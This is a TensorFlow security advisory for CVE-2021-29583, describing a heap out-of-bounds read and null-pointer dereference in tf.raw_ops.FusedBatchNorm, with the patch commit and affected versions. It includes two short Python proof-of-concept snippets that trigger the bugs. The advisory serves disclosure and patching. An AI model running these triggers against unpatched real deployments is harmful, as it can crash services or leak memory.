## TFSA-2021-072: Heap buffer overflow and undefined behavior in `FusedBatchNorm`

### CVE Number
CVE-2021-29583

### Impact
The implementation of `tf.raw_ops.FusedBatchNorm` is vulnerable to a heap buffer
overflow:

```python
import tensorflow as tf

x = tf.zeros([10, 10, 10, 6], dtype=tf.float32)
scale = tf.constant([0.0], shape=[1], dtype=tf.float32)
offset = tf.constant([0.0], shape=[1], dtype=tf.float32)
mean = tf.constant([0.0], shape=[1], dtype=tf.float32)
variance = tf.constant([0.0], shape=[1], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False

tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```

If the tensors are empty, the same implementation can trigger undefined behavior
by dereferencing null pointers:

```python
import tensorflow as tf
import numpy as np

x = tf.zeros([10, 10, 10, 1], dtype=tf.float32)
scale = tf.constant([], shape=[0], dtype=tf.float32)
offset = tf.constant([], shape=[0], dtype=tf.float32)
mean = tf.constant([], shape=[0], dtype=tf.float32)
variance = tf.constant([], shape=[0], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = "NHWC"
is_training = False

tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```

The
[implementation](https://github.com/tensorflow/tensorflow/blob/57d86e0db5d1365f19adcce848dfc1bf89fdd4c7/tensorflow/core/kernels/fused_batch_norm_op.cc)
fails to validate that `scale`, `offset`, `mean` and `variance` (the last two
only when required) all have the same number of elements as the number of
channels of `x`. This results in heap out of bounds reads when the buffers
backing these tensors are indexed past their boundary.

If the tensors are empty, the validation mentioned in the above paragraph would
also trigger and prevent the undefined behavior.

### Patches
We have patched the issue in GitHub commit
[6972f9dfe325636b3db4e0bc517ee22a159365c0](https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
